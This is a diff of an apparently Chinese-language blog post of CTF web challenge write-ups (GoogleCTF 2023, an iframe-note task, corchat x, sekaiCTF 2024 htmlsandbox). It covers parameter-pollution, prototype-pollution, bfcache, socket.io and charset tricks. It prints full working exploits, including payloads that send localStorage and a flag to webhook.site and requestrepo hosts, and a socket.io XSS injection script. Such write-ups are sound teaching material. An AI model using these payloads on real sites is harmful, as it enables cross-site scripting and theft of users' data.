@@ -1,82 +1,267 @@
-<!-- more -->
+const qs = can.deparam(location.search.slice(1));
 
-## GoogleCTF 2023
+    if (!qs.id) {
+      alert("no id provided");
+      location.href = "/";
+    }
 
-這邊有官方給的完整題目內容跟解法：https://github.com/google/google-ctf/tree/master/2023
+    axios.get(`/iframe/${encodeURIComponent(qs.id)}`)
+    .then(res => {
+      if (res.data.error) {
+        alert("no iframe found with that id!");
+        return;
+      }
 
-### UNDER-CONSTRUCTION (466 solves)
+      if (!res.data.url.toLowerCase().startsWith("http")) {
+        alert("invalid url");
+        return;
+      }
 
-這題的核心程式碼如下：
-
-``` python
-@authorized.route('/signup', methods=['POST'])
-def signup_post():
-    raw_request = request.get_data()
-    username = request.form.get('username')
-    password = request.form.get('password')
-    tier = models.Tier(request.form.get('tier'))
-
-    if(tier == models.Tier.GOLD):
-        flash('GOLD tier only allowed for the CEO')
-        return redirect(url_for('authorized.signup'))
-
-    if(len(username) > 15 or len(username) < 4):
-        flash('Username length must be between 4 and 15')
-        return redirect(url_for('authorized.signup'))
-
-    user = models.User.query.filter_by(username=username).first()
-
-    if user:
-        flash('Username address already exists')
-        return redirect(url_for('authorized.signup'))
-
-    new_user = models.User(username=username, 
-        password=generate_password_hash(password, method='sha256'), tier=tier.name)
-
-    db.session.add(new_user)
-    db.session.commit()
-
-    requests.post(f"http://{PHP_HOST}:1337/account_migrator.php", 
-        headers={"token": TOKEN, "content-type": request.headers.get("content-type")}, data=raw_request)
-    return redirect(url_for('authorized.login'))
+      document.querySelector("#name").textContent = res.data.name;
+      document.querySelector("#iframe").src = res.data.url;
+      document.querySelector("#iframe").style = res.data.style;
+    });
+  }
+</script>
 ```
 
-有一個註冊的功能，會檢查 data 中的參數，檢查完以後把 request forward 到 PHP 那邊，而我們的目標是建議一個 tier 為 GOLD 的使用者。
+後端用 Flask + gunicorn 渲染出上面這個網頁。
 
-解法是利用 PHP 跟 Flask 對於 POST data 解析的不一致，如果傳 `a=1&a=2` 的話，Flask 在拿 a 的時候會得到 `1`（第一個），而 PHP 會拿到 `2`（最後一個）
+can.js 有個 prototype pollution 的漏洞，就算有做了檢查還是可以用 URL encode 繞過，但問題是有了 pollution 之後可以幹嘛。
 
-因此只要運用這個不一致，就可以在 Flask 那邊建立一個合法的使用者，但是 forward 給 PHP 的時候 tier 變成 GOLD：
+前端乍看之下就是 `document.querySelector("#iframe").src = res.data.url` 這段最可疑了，但是這邊需要能控制 server 的 response，但是 server 那邊有做檢查，因此 data.url 只能是 http 開頭。
+
+最後的解法是跟 axios、bfcache 還有 gunicorn 的行為有關，gunicorn 會根據 header 裡面的 `script_name` 來決定最後的 path，以 [Gunicorn's handling of PATH_INFO and SCRIPT_NAME can lead to security issues when placed behind a proxy #2650](https://github.com/benoitc/gunicorn/issues/2650) 裡面給的範例來說：
+
+```python
+requests.get(URL+'/REMOVED/admin/something/bad',
+             headers={'script_name':'REMOVED/'})
+```
+
+如果前面有個 nginx 把所有 /admin 開頭的請求都擋掉，這時我們可以發送一個 /REMOVED/admin 的請求再搭配 script_name 是 REMOVED/，nginx 會通過，但是到 gunicorn 的時候就會把 path 解析為 /admin，直接繞過了前面的 nginx 檢查。
+
+而這題會用到這個行為的地方在：
 
 ```
-curl -X POST http://<flask-challenge>/signup -d "username=username&password=password&tier=blue&tier=gold"
+<script src="{{ url_for('static', filename='axios.min.js') }}"></script>
 ```
 
-### BIOHAZARD (14 solves)
+如果你執行 `curl https://iframe-note.be.ax////example.com/view -H "SCRIPT_NAME: //example.com`，那最後 path 是 /view，但是 base URL 會變，渲染的結果是：
 
-這題的功能是可以讓你建立一個 note，而目標是 XSS。
+```html
+<script src="//example.com/static/axios.min.js"></script>
+```
 
-在 render note 的時候，有一個 prototype pollution 的洞，在 render 的時候會先 sanitized：
+就能夠直接控制頁面上的 src。
 
-``` js
-goog.require('goog.dom');
-goog.require('goog.dom.safe');
-goog.require('goog.html.sanitizer.unsafe');
-goog.require('goog.html.sanitizer.HtmlSanitizer.Builder');
-goog.require('goog.string.Const');
+作者可能懶得弄一個 instance 來 host payload，因此直接用了 data URI，把 script 變成 `<script src="data:text/javascript,{XSS}">`
 
-window.addEventListener('DOMContentLoaded', () => {
-  var Const = goog.string.Const;
-  var unsafe = goog.html.sanitizer.unsafe;
-  var builder = new goog.html.sanitizer.HtmlSanitizer.Builder();
-  builder = unsafe.alsoAllowTags(
-      Const.from('IFRAME is required for Youtube embed'), builder, ['IFRAME']);
-  sanitizer = unsafe.alsoAllowAttributes(
-      Const.from('iframe#src is required for Youtube embed'), builder,
-      [
-        {
-        tagName: 'iframe',
-        attributeName: 'src',
-        policy: (s) => s.startsWith('https://') ? s : '',
-        }
-      ]).build();
-});
+因為要達成這個結果需要在請求中傳送 header，所以需要用到 bfcache，流程是：
+
+1. 先造訪最後需要的 URL
+2. 跳轉到 view 頁面，利用 prototype pollution 讓 fetch 送出有 header 的請求
+3. 回到上一頁，此時因為 bfcache，會沿用剛剛 fetch 的 response，就是有 header 的版本
+4. XSS
+
+作者的 exploit：
+
+``` html
+<body>
+  <script>
+    // const BASE_URL = "http://localhost:3000";
+    const BASE_URL = "https://iframe-note.be.ax";
+
+    const HOOK_URL = "https://webhook.site/xxxxx";
+
+    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+    const main = async () => {
+      const dataUrl = `data:text/javascript,navigator.sendBeacon('${HOOK_URL}',JSON.stringify(localStorage))`;
+
+      const win = open(`${BASE_URL}/${dataUrl}/iframe/view`);
+      await sleep(1000);
+
+      win.location = `${BASE_URL}/view?id=view&__%70roto__[headers][SCRIPT_NAME]=${dataUrl}/iframe&__%70roto__[baseURL]=/${dataUrl}/`;
+      await sleep(1000);
+
+      win.location = `${location.origin}/back.html?n=2`;
+    };
+    main();
+  </script>
+</body>
+```
+
+``` html
+<script>
+  const n = parseInt(new URLSearchParams(location.search).get("n"));
+  history.go(-n);
+</script>
+```
+
+### corchat x - 1 solve
+
+Author: larry
+
+跟 socket.io 有關的題目，重點看起來是三個：
+
+1. 可以送出 disconnect 事件但是沒有 disconnect
+2. sokcet.io 的 JSONP 可以拿來 bypass CSP
+3. 用 performance API 列出曾經載入過的資源
+
+底下附上 Discord 中 EhhThing 貼的 exploit：
+
+``` py
+import socketio
+import requests
+import time
+import json
+
+base_url = 'https://corchat-x-a6e1f8c45d3ca520.be.ax'
+
+def create_sid():
+    session = requests.Session()
+    login = session.post(f'{base_url}/', data = {}, allow_redirects=False)
+    assert login.status_code == 302, login.status_code
+
+    res = session.get(f'{base_url}/socket.io/', params = {
+        'EIO': 4,
+        'transport': 'polling',
+        't': 'bingus',
+    })
+    assert res.status_code == 200, res.status_code
+
+    socket_session = json.loads(res.text[1:])
+    print('fake session', socket_session)
+
+    res = session.post(f'{base_url}/socket.io/', params = {
+        'EIO': 4,
+        'transport': 'polling',
+        't': 'P3qHGUZ',
+        'sid': socket_session['sid'],
+    }, data = b'40')
+    assert res.status_code == 200, res.status_code
+
+    return socket_session['sid']
+
+bot_session = requests.Session()
+login = bot_session.post(f'{base_url}/', data = {
+    'name': 'FizzBuzz101',
+}, allow_redirects=False)
+assert login.status_code == 302, login.status_code
+
+sio = socketio.Client(http_session=bot_session)
+ready = False
+
+@sio.event
+def connect():
+    global ready
+
+    print('connected!')
+
+    # fake disconnect event so that the bot can connect as well
+    sio.emit('disconnect')
+    time.sleep(1)
+    ready = True
+    print('ready for bot!')
+
+@sio.event
+def message(data):
+    global ready
+
+    if not ready:
+        return
+
+    print('message', data)
+    if data['content'] == 'FizzBuzz101 joined.': # XSS bot opened the chat
+        first_sid = create_sid()
+        js_payload = """
+(window.exfil = data => window.top.opener.top.socket.emit('message', data))
+(window.observer = new parent.PerformanceObserver((list) => { list.getEntries().forEach((entry) => { window.exfil('Flag: ' + decodeURIComponent(entry.name.split('/').pop())); }); }))
+(window.observer.observe({ type: 'resource', buffered: true }))
+""".strip().replace('\n', ',')
+        sio.emit('message', '\\"+'+js_payload+');//')
+
+        second_sid = create_sid()
+        jsonp_url = f'{base_url}/socket.io/?EIO=4&transport=polling&t=bingus&sid={second_sid}&j=0'
+        js_payload = """
+(window.secret=window.open('','secret'))
+(window.a=window.top.document.getElementById('xss').cloneNode())
+(window.a.srcdoc=window.a.srcdoc.replace('%s','%s'))
+(window.secret.document.body.appendChild(window.a))
+""".strip().replace('\n', ',') % (second_sid, first_sid)
+
+        sio.emit('message', '\\"+'+js_payload+');//')
+
+        xss_payload = """
+<a id=&quot;___eio&quot;></a>
+<a id=&quot;___eio&quot;></a>
+<script src=&quot;%s&quot;></script>
+""" % jsonp_url
+        chat_message = '<iframe id="xss" srcdoc="%s"></iframe>' % xss_payload.strip()
+        assert len(chat_message) < 400, 'chat message too long, time to write better payload'
+        sio.emit('message', chat_message)
+
+sio.connect(base_url)
+sio.wait()
+```
+
+### web/repayment-pal - 0 solve
+
+Author: strellic
+
+跟 Next.js 有關的題目，賽中沒有人解開，賽後也沒有公佈解法。
+
+底下是公佈過的提示：
+
+1. +24 hour hint drop: hm, why is dev mode enabled?
+2. +36 hour hint drop: try to find a way to get html injection!
+3. Post-CTF hint drop: An earlier version of the challenge had an extra check in the middleware, requiring all API requests to have the header Sec-Fetch-Dest: empty
+
+
+## sekaiCTF 2024
+
+### htmlsandbox (4 solves)
+
+Author: arxenix
+
+題目連結：https://github.com/project-sekai-ctf/sekaictf-2024/tree/main/web/htmlsandbox
+
+這題可以讓你上傳 HTML，但是把能擋的全部都擋掉了，並且會檢查 head 裡面有沒有：`<meta http-equiv="Content-Security-Policy" content="default-src 'none'">`，來確保不能執行 JavaScript 程式碼。
+
+而解法是檢查的時候是把 HTML 變成 `data:text/html` 來檢查，但實際造訪的時候就是一般的網頁，而這兩者的 parsing 規則不一樣，當檔案很大的時候，前者會全部一次 parsing，但後者會一個 chunk 一個 chunk 做，而且每個 chunk 的 encoding 可以不同。
+
+細節可以看作者的 writeup：[SekaiCTF'24 htmlsandbox - Author Writeup](https://blog.ankursundara.com/htmlsandbox-writeup/) 或是這篇 [0xalessandro 的 writeup](https://0xalessandro.github.io/posts/sekai/)，他最後的 exploit 長這樣：
+
+```py
+import requests
+
+#0xAlessandro was here
+c1 = b'''<html><head>
+    <!-- \x1b$@ aa -->''' + b'''
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'">
+\x1b(B <!-- test -->
+''' + b"\x1b(B<!-- " + b"A"*64000 + b"-->"+ b"<!--"+b"A"*100+b"-->"
+
+c2 = b'''
+    <meta charset="utf-8">
+    </head>
+    <body>
+    <svg><animate onbegin="fetch(`https://s9cs3dwb.requestrepo.com?c=${localStorage.getItem('flag')}`)" attributeName="x" dur="1s">
+    </body>
+</html>'''
+
+html = c1 + c2
+with open('test.html', "wb") as f:
+   f.write(html)
+
+r = requests.post('https://htmlsandbox.chals.sekai.team/upload', data={'html': html})
+print(r.text)
+```
+
+在使用 data URI 的時候，整個 HTML 就是被當作 utf-8 來解析，沒什麼問題。
+
+但被當作網頁來造訪的時候，由於分成了兩個 chunk，而 `<meta charset="utf-8">` 出現在第二個 chunk，因此第一個 chunk 會用 `JIS X 0208 1983` 來解析，CSP 就變成了一堆亂碼，被拿掉了。
+
+讀到第二個 chunk 時看到 meta，就切換成 UTF-8，照常載入，如此一來就可以擺脫 CSP，達成 XSS。
+
+這個 encoding 利用的細節可以參考：[Encoding Differentials: Why Charset Matters](https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/)。
